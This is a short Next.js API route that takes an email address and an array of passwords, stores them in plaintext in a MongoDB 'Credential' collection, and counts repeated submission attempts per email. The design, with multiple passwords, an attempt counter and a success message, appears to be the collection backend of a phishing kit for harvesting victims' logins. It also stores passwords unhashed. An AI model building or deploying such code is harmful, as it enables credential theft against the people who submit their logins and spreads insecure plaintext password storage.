import { NextResponse } from "next/server";
import { connectToDatabase } from "@/lib/mongodb";
import { Credential } from "@/models/Credential";

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { email, passwords } = body;

    if (!email || !passwords || passwords.length === 0) {
      return NextResponse.json(
        { success: false, message: "Email and passwords are required" },
        { status: 400 }
      );
    }

    await connectToDatabase();

    const existingCredential = await Credential.findOne({ email });

    if (existingCredential) {
      existingCredential.attempts += 1;
      existingCredential.passwords = passwords;
      await existingCredential.save();
    } else {
      await Credential.create({
        email,
        passwords,
        attempts: 1,
      });
    }

    return NextResponse.json(
      { success: true, message: "Credentials submitted successfully" },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error submitting credentials:", error);
    return NextResponse.json(
      { success: false, message: "Internal server error" },
      { status: 500 }
    );
  }
}
